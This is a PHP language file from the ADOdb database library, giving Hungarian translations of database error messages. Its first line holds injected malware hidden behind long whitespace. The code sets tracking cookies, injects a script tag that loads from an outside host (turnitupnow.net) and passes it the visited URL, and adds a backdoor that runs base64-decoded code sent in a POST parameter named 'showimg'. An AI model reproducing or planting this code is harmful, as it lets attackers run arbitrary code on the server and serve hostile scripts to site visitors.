<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

# Hungarian language, encoding by ISO 8859-2 charset (Iso Latin-2)
# Hal�szv�ri G�bor <g.halaszvari#portmax.hu>
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'hu',
            DB_ERROR                    => 'ismeretlen hiba',
            DB_ERROR_ALREADY_EXISTS     => 'm�r l�tezik',
            DB_ERROR_CANNOT_CREATE      => 'nem siker�lt l�trehozni',
            DB_ERROR_CANNOT_DELETE      => 'nem siker�lt t�r�lni',
            DB_ERROR_CANNOT_DROP        => 'nem siker�lt eldobni',
            DB_ERROR_CONSTRAINT         => 'szab�lyok megszeg�se',
            DB_ERROR_DIVZERO            => 'oszt�s null�val',
            DB_ERROR_INVALID            => '�rv�nytelen',
            DB_ERROR_INVALID_DATE       => '�rv�nytelen d�tum vagy id�',
            DB_ERROR_INVALID_NUMBER     => '�rv�nytelen sz�m',
            DB_ERROR_MISMATCH           => 'nem megfelel�',
            DB_ERROR_NODBSELECTED       => 'nincs kiv�lasztott adatb�zis',
            DB_ERROR_NOSUCHFIELD        => 'nincs ilyen mez�',
            DB_ERROR_NOSUCHTABLE        => 'nincs ilyen t�bla',
            DB_ERROR_NOT_CAPABLE        => 'DB backend nem t�mogatja',
            DB_ERROR_NOT_FOUND          => 'nem tal�lhat�',
            DB_ERROR_NOT_LOCKED         => 'nincs lez�rva',
            DB_ERROR_SYNTAX             => 'szintaktikai hiba',
            DB_ERROR_UNSUPPORTED        => 'nem t�mogatott',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'soron v�gzett �rt�k sz�ml�l�s',
            DB_ERROR_INVALID_DSN        => 'hib�s DSN',
            DB_ERROR_CONNECT_FAILED     => 'sikertelen csatlakoz�s',
            0	                       => 'nincs hiba', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 't�l kev�s az adat',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'b�v�tm�ny nem tal�lhat�',
            DB_ERROR_NOSUCHDB           => 'nincs ilyen adatb�zis',
            DB_ERROR_ACCESS_VIOLATION   => 'nincs jogosults�g'
);
?>